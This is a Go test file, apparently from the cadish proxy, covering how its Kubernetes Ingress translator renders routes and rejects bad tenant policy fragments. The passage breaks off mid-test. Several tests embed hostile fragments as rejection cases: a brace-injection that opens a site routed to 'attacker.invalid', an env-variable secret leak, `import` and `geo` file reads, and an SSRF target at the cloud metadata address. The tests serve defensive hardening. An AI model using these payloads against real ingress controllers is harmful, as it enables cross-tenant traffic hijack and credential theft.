package ingress

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/cadi-sh/cadish/internal/config"
	"github.com/cadi-sh/cadish/internal/lb"
	"github.com/cadi-sh/cadish/internal/pipeline"
	networkingv1 "k8s.io/api/networking/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

// noopResolver lets a k8s:// Cadishfile compile offline (the compile check is the
// translator's correctness guard; real endpoint resolution is Layer 1's concern).
type noopResolver struct{}

func (noopResolver) ResolveEndpoints(context.Context, string, string, string) ([]lb.Endpoint, error) {
	return nil, nil
}
func (noopResolver) Watch(string, string, func()) func() { return nil }

// mustCompile proves the generated Cadishfile compiles through the real config
// compiler (with a fake k8s resolver injected so k8s:// targets resolve offline).
func mustCompile(t *testing.T, out string) {
	t.Helper()
	cfg, err := config.LoadStringWithOptions("<ingress>", out, config.LoadOptions{EndpointResolver: noopResolver{}})
	if err != nil {
		t.Fatalf("generated cadishfile did not compile:\n%s\nerr: %v", out, err)
	}
	_ = cfg.Close()
}

// --- test fixtures -----------------------------------------------------------

var (
	exact        = networkingv1.PathTypeExact
	prefix       = networkingv1.PathTypePrefix
	implSpecific = networkingv1.PathTypeImplementationSpecific
)

type pathRule struct {
	path     string
	pathType networkingv1.PathType
	svc      string
	port     int32
}

func backend(svc string, port int32) networkingv1.IngressBackend {
	return networkingv1.IngressBackend{
		Service: &networkingv1.IngressServiceBackend{
			Name: svc,
			Port: networkingv1.ServiceBackendPort{Number: port},
		},
	}
}

// ingress builds a *networkingv1.Ingress for host with the given path rules and
// spec.ingressClassName = "cadish".
func ingress(ns, name, host string, rules []pathRule) *networkingv1.Ingress {
	className := "cadish"
	paths := make([]networkingv1.HTTPIngressPath, 0, len(rules))
	for _, r := range rules {
		pt := r.pathType
		paths = append(paths, networkingv1.HTTPIngressPath{
			Path:     r.path,
			PathType: &pt,
			Backend:  backend(r.svc, r.port),
		})
	}
	return &networkingv1.Ingress{
		ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns},
		Spec: networkingv1.IngressSpec{
			IngressClassName: &className,
			Rules: []networkingv1.IngressRule{{
				Host: host,
				IngressRuleValue: networkingv1.IngressRuleValue{
					HTTP: &networkingv1.HTTPIngressRuleValue{Paths: paths},
				},
			}},
		},
	}
}

// ingressWithPolicy builds an Ingress for host with the given path rules and a
// cadi.sh/policy: <policyRef> annotation.
func ingressWithPolicy(ns, name, host, policyRef string, rules []pathRule) *networkingv1.Ingress {
	in := ingress(ns, name, host, rules)
	in.Annotations = map[string]string{policyAnnotation: policyRef}
	return in
}

// ingressWithDefault builds an Ingress for host with NO path rules but a
// spec.defaultBackend pointing at svc:port (the cluster-wide fallback).
func ingressWithDefault(ns, name, host, svc string, port int32) *networkingv1.Ingress {
	in := ingress(ns, name, host, nil)
	b := backend(svc, port)
	in.Spec.DefaultBackend = &b
	return in
}

func idxOf(s, sub string) int { return strings.Index(s, sub) }

func assertOrder(t *testing.T, out, first, second string) {
	t.Helper()
	i, j := idxOf(out, first), idxOf(out, second)
	if i < 0 || j < 0 {
		t.Fatalf("expected both %q and %q present:\n%s", first, second, out)
	}
	if i > j {
		t.Fatalf("%q must precede %q:\n%s", first, second, out)
	}
}

// --- tests -------------------------------------------------------------------

func TestTranslateBasic(t *testing.T) {
	ing := ingress("prod", "site", "example.com", []pathRule{
		{path: "/api", pathType: prefix, svc: "api-svc", port: 8080},
		{path: "/", pathType: prefix, svc: "web-svc", port: 80},
	})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects: %v", rej)
	}
	// The generated config must COMPILE (the real proof of correctness).
	mustCompile(t, out)
	// /api (longer prefix) must be ordered before / (catch-all): first-match-wins
	// reproduces Ingress most-specific semantics.
	if idxOf(out, "k8s://api-svc.prod:8080") > idxOf(out, "k8s://web-svc.prod:80") {
		t.Fatalf("api route must precede web route:\n%s", out)
	}
}

func TestTranslatePathTypes(t *testing.T) {
	ing := ingress("prod", "s", "h.test", []pathRule{
		{path: "/exact", pathType: exact, svc: "e", port: 80},
		{path: "/p", pathType: prefix, svc: "p", port: 80},
		{path: "/i", pathType: implSpecific, svc: "i", port: 80},
	})
	out, _ := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	mustCompile(t, out)
	// Exact before Prefix in the sort (assert on the matcher lines — a bare "/p"
	// substring also appears inside the k8s://p.prod upstream URL).
	assertOrder(t, out, "path /exact", "path /p")
}

// compileSite compiles the rendered Cadishfile (single site) into a config and
// returns the live pipeline for the given host, so a test can assert SERVED routing
// (EvalRequest) — not just rendered text.
func pipelineFor(t *testing.T, out, host string) *pipeline.Pipeline {
	t.Helper()
	cfg, err := config.LoadStringWithOptions("<ingress>", out, config.LoadOptions{EndpointResolver: noopResolver{}})
	if err != nil {
		t.Fatalf("generated cadishfile did not compile:\n%s\nerr: %v", out, err)
	}
	t.Cleanup(func() { _ = cfg.Close() })
	for _, s := range cfg.Sites {
		for _, a := range s.Addresses {
			if a == host {
				return s.Pipeline
			}
		}
	}
	t.Fatalf("no site for host %q in:\n%s", host, out)
	return nil
}

// TestTranslateExactNoCatchAll404 is the F7 guard: an Ingress with pathType Exact on
// /exact and NO catch-all must 404 every unmatched path (/exact/sub, /notexist,
// /anything) instead of silently falling back to the site's first/declared upstream.
func TestTranslateExactNoCatchAll404(t *testing.T) {
	ing := ingress("prod", "s", "h.test", []pathRule{
		{path: "/exact", pathType: exact, svc: "e", port: 80},
	})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects: %v", rej)
	}
	mustCompile(t, out)
	p := pipelineFor(t, out, "h.test")

	// The matched Exact path routes to its upstream (no synthetic).
	if dec := p.EvalRequest(&pipeline.Request{Method: "GET", Host: "h.test", Path: "/exact"}); dec.Synthetic != nil {
		t.Fatalf("/exact should route, not 404: %+v", dec.Synthetic)
	}
	// Every unmatched path 404s (was 200 via the first-upstream fallback bug).
	for _, path := range []string{"/exact/sub", "/notexist", "/anything", "/"} {
		dec := p.EvalRequest(&pipeline.Request{Method: "GET", Host: "h.test", Path: path})
		if dec.Synthetic == nil || dec.Synthetic.Status != 404 {
			t.Errorf("unmatched %q must 404, got %+v (upstream=%q)", path, dec.Synthetic, dec.Upstream)
		}
	}
}

// TestTranslatePrefixElementMatch is the F7 element-wise Prefix guard: pathType
// Prefix on /api matches /api and /api/<sub> but NOT /apiother (Kubernetes matches
// whole path elements), and an unmatched path 404s.
func TestTranslatePrefixElementMatch(t *testing.T) {
	ing := ingress("prod", "s", "h.test", []pathRule{
		{path: "/api", pathType: prefix, svc: "api", port: 80},
	})
	out, _ := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	mustCompile(t, out)
	p := pipelineFor(t, out, "h.test")

	for _, ok := range []string{"/api", "/api/", "/api/v1/users"} {
		if dec := p.EvalRequest(&pipeline.Request{Method: "GET", Host: "h.test", Path: ok}); dec.Synthetic != nil {
			t.Errorf("Prefix /api must match %q, got 404: %+v", ok, dec.Synthetic)
		}
	}
	for _, no := range []string{"/apiother", "/ap", "/", "/admin"} {
		dec := p.EvalRequest(&pipeline.Request{Method: "GET", Host: "h.test", Path: no})
		if dec.Synthetic == nil || dec.Synthetic.Status != 404 {
			t.Errorf("Prefix /api must NOT match %q (expect 404), got %+v", no, dec.Synthetic)
		}
	}
}

// TestTranslateCatchAllNo404 proves a site WITH a Prefix "/" catch-all keeps serving
// every path from the catch-all upstream (no terminal 404 emitted) — the fix must not
// regress the common case.
func TestTranslateCatchAllNo404(t *testing.T) {
	ing := ingress("prod", "s", "h.test", []pathRule{
		{path: "/api", pathType: prefix, svc: "api", port: 8080},
		{path: "/", pathType: prefix, svc: "web", port: 80},
	})
	out, _ := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	mustCompile(t, out)
	if strings.Contains(out, "respond") {
		t.Fatalf("a catch-all site must not emit a terminal respond:\n%s", out)
	}
	p := pipelineFor(t, out, "h.test")
	for _, path := range []string{"/api", "/anything", "/"} {
		if dec := p.EvalRequest(&pipeline.Request{Method: "GET", Host: "h.test", Path: path}); dec.Synthetic != nil {
			t.Errorf("catch-all site should serve %q, got %+v", path, dec.Synthetic)
		}
	}
}

// TestTranslateDefaultBackendNoBleed is the F8 guard: a spec.defaultBackend on
// Ingress A (host a.test) must NOT become the unmatched-path fallback for host b.test,
// which is owned by a DIFFERENT Ingress B with only an Exact /only rule. b.test's
// unmatched paths must 404, not fall through to A's defaultBackend.
func TestTranslateDefaultBackendNoBleed(t *testing.T) {
	a := ingressWithDefault("prod", "a", "a.test", "fallback-a", 80)
	a.Spec.Rules = []networkingv1.IngressRule{{
		Host: "a.test",
		IngressRuleValue: networkingv1.IngressRuleValue{
			HTTP: &networkingv1.HTTPIngressRuleValue{Paths: []networkingv1.HTTPIngressPath{{
				Path: "/a", PathType: &prefix, Backend: backend("a-svc", 80),
			}}},
		},
	}}
	b := ingress("prod", "b", "b.test", []pathRule{
		{path: "/only", pathType: exact, svc: "b-svc", port: 80},
	})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{a, b}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects: %v", rej)
	}
	mustCompile(t, out)

	// a.test: its OWN defaultBackend catches unmatched paths (no 404).
	pa := pipelineFor(t, out, "a.test")
	if dec := pa.EvalRequest(&pipeline.Request{Method: "GET", Host: "a.test", Path: "/unmatched"}); dec.Synthetic != nil {
		t.Errorf("a.test unmatched should hit its own defaultBackend, got 404: %+v", dec.Synthetic)
	}

	// b.test: A's defaultBackend must NOT bleed here — unmatched paths 404.
	pb := pipelineFor(t, out, "b.test")
	if dec := pb.EvalRequest(&pipeline.Request{Method: "GET", Host: "b.test", Path: "/only"}); dec.Synthetic != nil {
		t.Errorf("b.test /only should route, got 404: %+v", dec.Synthetic)
	}
	dec := pb.EvalRequest(&pipeline.Request{Method: "GET", Host: "b.test", Path: "/unmatched"})
	if dec.Synthetic == nil || dec.Synthetic.Status != 404 {
		t.Errorf("b.test unmatched must 404 (A's defaultBackend must not bleed), got %+v", dec.Synthetic)
	}
	// A's fallback upstream must never appear in b.test's site.
	if strings.Contains(siteBlockFor(out, "b.test"), "fallback-a") {
		t.Errorf("A's defaultBackend leaked into b.test's site:\n%s", out)
	}
}

// --- A1: cross-namespace ROUTING host-ownership (first-claim lock) -----------

// TestTranslateRejectsCrossNamespaceRouting is the A1 guard (mirrors the TLS
// first-claim ownership of D64): when an Ingress in one namespace declares a rule for a
// host whose routing is OWNED by the oldest Ingress in ANOTHER namespace, its rules for
// that host are REJECTED (per-Ingress Event) and never merged. The owner keeps its
// routing intact; the attacker's catch-all never appears in the host's site.
func TestTranslateRejectsCrossNamespaceRouting(t *testing.T) {
	t0 := time.Unix(1000, 0) // oldest → owns victim.com's routing
	t1 := time.Unix(2000, 0)
	owner := ingressAt("ns-b", "owner", "victim.com", t0, []pathRule{
		{path: "/app", pathType: prefix, svc: "owner-svc", port: 80},
	})
	// ns-a tries to parasitize victim.com with a "/" catch-all.
	attacker := ingressAt("ns-a", "attacker", "victim.com", t1, []pathRule{
		{path: "/", pathType: prefix, svc: "attacker-svc", port: 80},
	})

	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{owner, attacker}, ClassName: "cadish"})
	mustCompile(t, out)

	// The attacker's cross-namespace claim must be rejected.
	rejected := false
	for _, r := range rej {
		if r.Ingress == "ns-a/attacker" {
			rejected = true
		}
	}
	if !rejected {
		t.Fatalf("cross-namespace routing claim was NOT rejected; rejects=%v\n%s", rej, out)
	}
	// The attacker's backend must never appear in the host's site.
	if strings.Contains(out, "attacker-svc") {
		t.Fatalf("attacker backend leaked into victim.com's routing:\n%s", out)
	}
	// The owner's routing is intact.
	if !strings.Contains(out, "k8s://owner-svc.ns-b:80") {
		t.Fatalf("owner routing missing:\n%s", out)
	}
}

// TestTranslateSameNamespaceHostMerges proves the legitimate multi-Ingress-per-host case
// still merges WITHIN a namespace (a namespace owns its own host): two Ingresses in the
// SAME namespace contributing different paths to one host both serve, no reject.
func TestTranslateSameNamespaceHostMerges(t *testing.T) {
	t0 := time.Unix(1000, 0)
	t1 := time.Unix(2000, 0)
	a := ingressAt("prod", "a", "shop.test", t0, []pathRule{
		{path: "/api", pathType: prefix, svc: "api-svc", port: 8080},
	})
	b := ingressAt("prod", "b", "shop.test", t1, []pathRule{
		{path: "/", pathType: prefix, svc: "web-svc", port: 80},
	})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{a, b}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects for same-namespace host merge: %v", rej)
	}
	mustCompile(t, out)
	if !strings.Contains(out, "k8s://api-svc.prod:8080") || !strings.Contains(out, "k8s://web-svc.prod:80") {
		t.Fatalf("same-namespace merge dropped a backend:\n%s", out)
	}
}

// TestTranslateRoutingOwnershipRejectsDefaultBackend proves a cross-namespace
// defaultBackend for an owned host is also rejected (a defaultBackend is a host-scoped
// terminal fallback — letting a foreign namespace add one would re-route every unmatched
// path on the victim's host).
func TestTranslateRoutingOwnershipRejectsDefaultBackend(t *testing.T) {
	t0 := time.Unix(1000, 0)
	t1 := time.Unix(2000, 0)
	owner := ingressAt("ns-b", "owner", "victim.com", t0, []pathRule{
		{path: "/app", pathType: exact, svc: "owner-svc", port: 80},
	})
	attacker := ingressWithDefault("ns-a", "attacker", "victim.com", "attacker-fallback", 80)
	attacker.CreationTimestamp = metav1.NewTime(t1)

	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{owner, attacker}, ClassName: "cadish"})
	mustCompile(t, out)

	rejected := false
	for _, r := range rej {
		if r.Ingress == "ns-a/attacker" {
			rejected = true
		}
	}
	if !rejected {
		t.Fatalf("cross-namespace defaultBackend claim was NOT rejected; rejects=%v\n%s", rej, out)
	}
	if strings.Contains(out, "attacker-fallback") {
		t.Fatalf("attacker defaultBackend leaked into victim.com's site:\n%s", out)
	}
}

// siteBlockFor returns the `host { … }` block text for host from a rendered config.
func siteBlockFor(out, host string) string {
	start := strings.Index(out, host+" {")
	if start < 0 {
		return ""
	}
	depth := 0
	for i := start; i < len(out); i++ {
		switch out[i] {
		case '{':
			depth++
		case '}':
			depth--
			if depth == 0 {
				return out[start : i+1]
			}
		}
	}
	return out[start:]
}

func TestTranslateDefaultBackend(t *testing.T) {
	ing := ingressWithDefault("prod", "s", "h.test", "fallback-svc", 80)
	out, _ := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	mustCompile(t, out)
	if !strings.Contains(out, "k8s://fallback-svc.prod:80") {
		t.Fatalf("defaultBackend missing:\n%s", out)
	}
}

// validPolicyFragment is a cadi.sh/policy fragment in VALID Cadishfile syntax: a
// path matcher plus a cache_ttl directive scoped to it. (The plan's illustrative
// `static: path *.css` is not valid cadish; the compile check is the guard.)
const validPolicyFragment = "@static path *.css\ncache_ttl @static ttl 1h"

func TestTranslatePolicyFragment(t *testing.T) {
	ing := ingressWithPolicy("prod", "site", "example.com", "prod/cache-policy",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	policies := map[string]string{"prod/cache-policy": validPolicyFragment}
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, Policies: policies, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects: %v", rej)
	}
	mustCompile(t, out)
	if !strings.Contains(out, "cache_ttl") {
		t.Fatalf("policy fragment not layered:\n%s", out)
	}
}

func TestTranslateBadPolicyIsSkippedNotFatal(t *testing.T) {
	ing := ingressWithPolicy("prod", "site", "example.com", "prod/bad",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	out, rej := Translate(Inputs{
		Ingresses: []*networkingv1.Ingress{ing},
		Policies:  map[string]string{"prod/bad": "this is { not valid cadish"},
		ClassName: "cadish",
	})
	if len(rej) == 0 {
		t.Fatal("expected a reject for the bad policy fragment")
	}
	// Routes still present and compile WITHOUT the bad fragment.
	mustCompile(t, out)
	if !strings.Contains(out, "k8s://web.prod:80") {
		t.Fatalf("route dropped along with the bad fragment:\n%s", out)
	}
}

// TestTranslatePolicyFragmentCannotInjectSite is the CRITICAL regression guard: a
// cadi.sh/policy fragment with balanced extra braces must NOT be able to close the
// synthetic validation site and open a second, arbitrary-hostname site (a cross-tenant
// traffic hijack). The fragment must be REJECTED and the rendered config must compile
// to exactly the tenant's own site — never the attacker's victim site.
func TestTranslatePolicyFragmentCannotInjectSite(t *testing.T) {
	// Balanced braces: the leading "}" closes the synthetic _validate site and the
	// trailing brace (the wrapper's own) closes the injected victim site, so the old
	// compile-only check passes and the fragment is layered verbatim into the tenant.
	const exploit = "}\n" +
		"victim.example.com {\n" +
		"upstream evil { to http://attacker.invalid:80 }\n" +
		"route -> evil"

	ing := ingressWithPolicy("prod", "site", "tenant.example.com", "prod/evil-policy",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	out, rej := Translate(Inputs{
		Ingresses: []*networkingv1.Ingress{ing},
		Policies:  map[string]string{"prod/evil-policy": exploit},
		ClassName: "cadish",
	})

	// The fragment must be rejected (naming the policy ref) and dropped.
	rejected := false
	for _, r := range rej {
		if strings.Contains(r.Ingress, "evil-policy") || strings.Contains(r.Reason, "evil-policy") {
			rejected = true
		}
	}
	if !rejected {
		t.Fatalf("exploit fragment was NOT rejected; rejects=%v\noutput:\n%s", rej, out)
	}

	// The injected hostname must never appear in the rendered text.
	if strings.Contains(out, "victim.example.com") || strings.Contains(out, "attacker.invalid") {
		t.Fatalf("exploit fragment injected a foreign site:\n%s", out)
	}

	// The rendered config compiles to EXACTLY the tenant site — never the victim.
	cfg, err := config.LoadStringWithOptions("<ingress>", out, config.LoadOptions{EndpointResolver: noopResolver{}})
	if err != nil {
		t.Fatalf("rendered config did not compile:\n%s\nerr: %v", out, err)
	}
	defer cfg.Close()
	if len(cfg.Sites) != 1 {
		t.Fatalf("expected exactly 1 site, got %d:\n%s", len(cfg.Sites), out)
	}
	if !hasSiteHost(cfg, "tenant.example.com") {
		t.Fatalf("tenant site missing:\n%s", out)
	}
	if hasSiteHost(cfg, "victim.example.com") {
		t.Fatalf("victim site was injected (traffic hijack):\n%s", out)
	}
}

// TestTranslateCrossNamespacePolicyRejected proves a cadi.sh/policy ref naming a
// ConfigMap in ANOTHER namespace is rejected and never layered (a tenant must not be
// able to pull another namespace's policy fragment).
func TestTranslateCrossNamespacePolicyRejected(t *testing.T) {
	ing := ingressWithPolicy("prod", "site", "tenant.example.com", "other/secret-policy",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	// Even if the controller somehow supplied content for the foreign ref, the
	// translator's own-namespace gate must drop it.
	out, rej := Translate(Inputs{
		Ingresses: []*networkingv1.Ingress{ing},
		Policies:  map[string]string{"other/secret-policy": validPolicyFragment},
		ClassName: "cadish",
	})
	rejected := false
	for _, r := range rej {
		if strings.Contains(r.Reason, "own namespace") {
			rejected = true
		}
	}
	if !rejected {
		t.Fatalf("cross-namespace policy ref was not rejected; rejects=%v", rej)
	}
	if strings.Contains(out, "cache_ttl") {
		t.Fatalf("cross-namespace policy fragment was layered:\n%s", out)
	}
	mustCompile(t, out)
}

// TestTranslatePolicyFragmentNoEnvExfil is the FIX-1 env-exfiltration guard: a policy
// fragment that references an environment variable ({$VAR}) must NOT expand against the
// CONTROLLER POD's process env (which holds secrets like the admin token). The fragment
// is rejected outright and never layered, and even after the combined config runs its
// env-substitution pass the secret value never appears in the served config.
func TestTranslatePolicyFragmentNoEnvExfil(t *testing.T) {
	const secret = "s3cr3t-admin-token-do-not-leak"
	t.Setenv("CADISH_HARDEN_TEST_SECRET", secret)

	ing := ingressWithPolicy("prod", "site", "tenant.example.com", "prod/exfil-policy",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	out, rej := Translate(Inputs{
		Ingresses: []*networkingv1.Ingress{ing},
		Policies:  map[string]string{"prod/exfil-policy": "header X-Leak {$CADISH_HARDEN_TEST_SECRET}"},
		ClassName: "cadish",
	})

	rejected := false
	for _, r := range rej {
		if strings.Contains(r.Ingress, "exfil-policy") || strings.Contains(r.Reason, "exfil-policy") {
			rejected = true
		}
	}
	if !rejected {
		t.Fatalf("env-referencing fragment was NOT rejected; rejects=%v\noutput:\n%s", rej, out)
	}
	if strings.Contains(out, secret) {
		t.Fatalf("secret env value leaked into rendered config:\n%s", out)
	}
	// Compile through the REAL load path (which runs SubstituteEnv against the process
	// env): the secret must still never materialise in the served config.
	cfg, err := config.LoadStringWithOptions("<ingress>", out, config.LoadOptions{EndpointResolver: noopResolver{}})
	if err != nil {
		t.Fatalf("rendered config did not compile:\n%s\nerr: %v", out, err)
	}
	defer cfg.Close()
	if strings.Contains(out, secret) {
		t.Fatalf("secret leaked after compile:\n%s", out)
	}
	// Routing still serves without the rejected fragment.
	if !strings.Contains(out, "k8s://web.prod:80") {
		t.Fatalf("route dropped along with the rejected fragment:\n%s", out)
	}
}

// TestTranslatePolicyFragmentRejectsImport is the FIX-A file-read guard: a policy
// fragment containing an `import` directive must be rejected BEFORE any filesystem I/O
// occurs. Without this guard, import resolves paths against the controller pod's
// filesystem via pipeline.FileImportResolver, and a parse error of the imported file's
// content is echoed back into the Ingress status (tenant-readable), leaking file
// contents. Both a top-level `import` and a nested `import` inside a block are checked.
// The test uses a real existing file (os.TempDir) to prove the fragment is rejected by
// the directive block-list — not incidentally because the file is absent.
func TestTranslatePolicyFragmentRejectsImport(t *testing.T) {
	// Create a file with known content; without the fix, its content would leak in the
	// reject Reason (the importer's parse error includes the first token of the file).
	f, err := os.CreateTemp("", "cadish-import-vuln-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	secret := "CADISH-SECRET-SHOULD-NOT-LEAK"
	_, _ = f.WriteString(secret + "\n")
	f.Close()
	defer os.Remove(f.Name())

	cases := map[string]string{
		"import top-level":       "import " + f.Name(),
		"import nested in block": "cache {\n\timport " + f.Name() + "\n}",
	}
	for name, frag := range cases {
		t.Run(name, func(t *testing.T) {
			ing := ingressWithPolicy("prod", "site", "tenant.example.com", "prod/p",
				[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
			out, rej := Translate(Inputs{
				Ingresses: []*networkingv1.Ingress{ing},
				Policies:  map[string]string{"prod/p": frag},
				ClassName: "cadish",
			})
			rejected := false
			for _, r := range rej {
				if strings.Contains(r.Ingress, "prod/p") {
					rejected = true
					// The reject reason must NOT contain file content.
					if strings.Contains(r.Reason, secret) {
						t.Errorf("file content leaked in reject reason (%s): %s", name, r.Reason)
					}
				}
			}
			if !rejected {
				t.Fatalf("fragment %q (%s) was NOT rejected; rejects=%v\n%s", frag, name, rej, out)
			}
			// Route still serves without the rejected fragment.
			if !strings.Contains(out, "k8s://web.prod:80") {
				t.Fatalf("route dropped along with the rejected fragment:\n%s", out)
			}
		})
	}
}

// TestTranslatePolicyFragmentRejectsBackendDirectives is the FIX-1 directive allow-list
// guard: a policy fragment must be POLICY-ONLY. A fragment that tries to define a
// backend/route/credential (upstream, cluster, origin, route, to, sign) is rejected and
// never layered — this closes SSRF / cross-namespace-upstream via a policy ConfigMap.
func TestTranslatePolicyFragmentRejectsBackendDirectives(t *testing.T) {
	cases := map[string]string{
		"upstream": "upstream x { to k8s://svc.other-ns:80 }",
		"route":    "route -> u_default",
		"to":       "to http://169.254.169.254/latest/meta-data/",
		"cluster":  "cluster c { to http://x:80 }",
		"origin":   "origin foo { to http://x:80 }",
		"sign":     "sign foo",
	}
	for name, frag := range cases {
		t.Run(name, func(t *testing.T) {
			ing := ingressWithPolicy("prod", "site", "tenant.example.com", "prod/p",
				[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
			out, rej := Translate(Inputs{
				Ingresses: []*networkingv1.Ingress{ing},
				Policies:  map[string]string{"prod/p": frag},
				ClassName: "cadish",
			})
			rejected := false
			for _, r := range rej {
				if strings.Contains(r.Ingress, "prod/p") {
					rejected = true
				}
			}
			if !rejected {
				t.Fatalf("fragment %q (%s) was NOT rejected; rejects=%v\n%s", frag, name, rej, out)
			}
			// Route still serves without the rejected fragment.
			if !strings.Contains(out, "k8s://web.prod:80") {
				t.Fatalf("route dropped along with the rejected fragment:\n%s", out)
			}
			mustCompile(t, out)
		})
	}
}

// TestTranslatePolicyFragmentAllowsPolicyDirectives proves the allow-list does not over-
// reject: a legitimate cache/header policy fragment still layers and compiles.
func TestTranslatePolicyFragmentAllowsPolicyDirectives(t *testing.T) {
	ing := ingressWithPolicy("prod", "site", "example.com", "prod/cache-policy",
		[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	out, rej := Translate(Inputs{
		Ingresses: []*networkingv1.Ingress{ing},
		Policies:  map[string]string{"prod/cache-policy": "@static path *.css\ncache_ttl @static ttl 1h\nheader X-Cache hit"},
		ClassName: "cadish",
	})
	if len(rej) != 0 {
		t.Fatalf("unexpected rejects for valid policy fragment: %v", rej)
	}
	mustCompile(t, out)
	if !strings.Contains(out, "cache_ttl") || !strings.Contains(out, "X-Cache") {
		t.Fatalf("valid policy fragment not layered:\n%s", out)
	}
}

// TestTranslateRejectsMalformedHost is the FIX-5 host-syntax guard: a rule whose host is
// not a valid DNS hostname is rejected with a Reject/Event (not silently emitted into the
// Cadishfile, and not relying on the API server to have caught it). Valid hosts (incl. a
// "*." wildcard) still render.
func TestTranslateRejectsMalformedHost(t *testing.T) {
	bad := []string{"bad host.com", "-bad.com", "bad_host.com", "*.*.com", "exa!mple.com", "host..com"}
	for _, h := range bad {
		ing := ingress("prod", "site", h, []pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
		out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
		found := false
		for _, r := range rej {
			if strings.Contains(strings.ToLower(r.Reason), "host") {
				found = true
			}
		}
		if !found {
			t.Errorf("malformed host %q was not rejected; rejects=%v", h, rej)
		}
		if strings.Contains(out, h) {
			t.Errorf("malformed host %q leaked into the rendered config:\n%s", h, out)
		}
	}

	// A valid wildcard host still renders.
	ing := ingress("prod", "wild", "*.example.com", []pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{ing}, ClassName: "cadish"})
	if len(rej) != 0 {
		t.Fatalf("valid wildcard host rejected: %v", rej)
	}
	if !strings.Contains(out, "*.example.com {") {
		t.Fatalf("valid wildcard host not rendered:\n%s", out)
	}
}

// TestTranslatePolicyFragmentRejectsGeo is the FIX-A geo-as-file-read guard: a
// policy fragment containing `geo { source cidr <path> }` or
// `geo { source maxmind <path> }` is rejected BEFORE any filesystem I/O occurs.
// Without this guard the config compiler opens the supplied path and any parse
// error echoes the file's first token via %q into the Ingress status reject
// reason — making arbitrary pod files tenant-readable (same class of bug as
// `import`). Both source types are checked; the secret token must never appear
// in the reject reason.
func TestTranslatePolicyFragmentRejectsGeo(t *testing.T) {
	f, err := os.CreateTemp("", "cadish-geo-vuln-*.txt")
	if err != nil {
		t.Fatal(err)
	}
	secret := "CADISH-GEO-SECRET-SHOULD-NOT-LEAK"
	_, _ = f.WriteString(secret + "\n")
	f.Close()
	defer os.Remove(f.Name())

	cases := map[string]string{
		"geo source cidr":    "geo { source cidr " + f.Name() + " }",
		"geo source maxmind": "geo { source maxmind " + f.Name() + " }",
	}
	for name, frag := range cases {
		t.Run(name, func(t *testing.T) {
			ing := ingressWithPolicy("prod", "site", "tenant.example.com", "prod/geo-policy",
				[]pathRule{{path: "/", pathType: prefix, svc: "web", port: 80}})
			out, rej := Translate(Inputs{
				Ingresses: []*networkingv1.Ingress{ing},
				Policies:  map[string]string{"prod/geo-policy": frag},
				ClassName: "cadish",
			})
			rejected := false
			for _, r := range rej {
				if strings.Contains(r.Ingress, "prod/geo-policy") {
					rejected = true
					// The reject reason must NOT contain file content.
					if strings.Contains(r.Reason, secret) {
						t.Errorf("file content leaked in reject reason (%s): %s", name, r.Reason)
					}
				}
			}
			if !rejected {
				t.Fatalf("geo fragment %q (%s) was NOT rejected; rejects=%v\n%s", frag, name, rej, out)
			}
			// Route still serves without the rejected fragment.
			if !strings.Contains(out, "k8s://web.prod:80") {
				t.Fatalf("route dropped along with the rejected geo fragment:\n%s", out)
			}
		})
	}
}

// TestTranslateRejectsCrossNamespaceWildcardSubdomain (Fix 2, security completeness):
// team-a owns `*.example.com` (the OLDEST Ingress), so the routing/TLS ownership of its
// concrete subdomains belongs to team-a. team-b's EXACT Ingress for `app.example.com`
// would win at serving time (exact-before-wildcard) and steal/blackhole the subdomain +
// grab its cert slot. The translator must REJECT team-b's foreign EXACT claim under
// team-a's wildcard (mirroring the Gateway controller's wildcardListenerOwner guard).
func TestTranslateRejectsCrossNamespaceWildcardSubdomain(t *testing.T) {
	t0 := time.Unix(1000, 0) // oldest → team-a owns *.example.com
	t1 := time.Unix(2000, 0)
	owner := ingressAt("team-a", "wild", "*.example.com", t0, []pathRule{
		{path: "/", pathType: prefix, svc: "owner-svc", port: 80},
	})
	attacker := ingressAt("team-b", "exact", "app.example.com", t1, []pathRule{
		{path: "/", pathType: prefix, svc: "evil-svc", port: 80},
	})

	out, rej := Translate(Inputs{Ingresses: []*networkingv1.Ingress{owner, attacker}, ClassName: "cadish"})
	mustCompile(t, out)

	rejected := false
	for _, r := range rej {
		if r.Ingress == "team-b/exact" {
			rejected = true
		}
	}
	if !rejected {
